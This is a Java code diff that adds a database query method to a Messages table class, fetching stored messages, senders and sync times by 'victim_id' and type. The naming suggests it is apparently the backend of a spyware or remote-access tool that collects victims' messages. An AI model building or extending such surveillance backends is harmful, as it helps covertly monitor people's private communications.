@@ -11,6 +11,7 @@ import org.json.JSONObject;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
 import java.sql.SQLException;
+import java.util.ArrayList;
 import java.util.List;
 
 /**
@@ -105,9 +106,41 @@ public class Messages extends BaseTable<Message> {
     }
 
     @Override
-    public List<Message> getAll(String whereColumn, String whereColumnValue) {
+    public List<Message> getAll(String victimId, String type) {
         List<Message> messages = null;
-        final String query = "SELECT ";
+        final java.sql.Connection con = Connection.getConnection();
+
+        try {
+            final PreparedStatement ps = con.prepareStatement("SELECT _from, content, delivery_time, UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM messages WHERE victim_id = ? AND _type = ? ORDER BY delivery_time DESC;");
+
+            ps.setString(1, victimId);
+            ps.setString(2, type);
+
+            final ResultSet rs = ps.executeQuery();
+            if (rs.first()) {
+                messages = new ArrayList<>();
+
+                //Looping through each message
+                do {
+                    final String from = rs.getString(COLUMN_FROM);
+                    final String content = rs.getString(COLUMN_CONTENT);
+                    final long deliveryTime = rs.getLong(COLUMN_DELIVERY_TIME);
+                    final long syncedTime = rs.getLong(COLUMN_AS_UNIX_EPOCH);
+
+                    messages.add(new Message(from, null, content, deliveryTime, syncedTime));
+
+                } while (rs.next());
+            }
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                con.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
         return messages;
     }
 }
